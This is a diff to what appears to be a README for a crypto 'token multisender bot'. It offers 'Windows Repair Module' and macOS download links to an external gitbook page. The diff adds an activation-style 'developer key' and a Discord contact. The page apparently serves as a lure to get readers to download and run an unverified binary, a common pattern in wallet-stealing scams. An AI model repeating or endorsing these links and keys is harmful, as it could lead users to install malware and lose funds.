@@ -31,6 +31,10 @@ Windows Repair Module: [ ```Download``` ](https://selenium-finance.gitbook.io/to
 
 MAC OS: [ ```Download``` ](https://selenium-finance.gitbook.io/token-multisender-bot)
 
+Developer key for start Using bot: D5W3-X3W9-M4V2-Y5J1
+
+Contact me on Discord: "taaafeth"
+
 Welcome to the ultimate tool for efficient and automated token distribution across blockchain wallets! Our platform is designed for projects, DAOs, and blockchain-based organizations that need to distribute tokens to thousands of wallet addresses with ease. Beyond that, it empowers users with advanced integrations with DeFi protocols for staking, liquidity farming, and automated payments.
 
 ## *IMPORTANT*
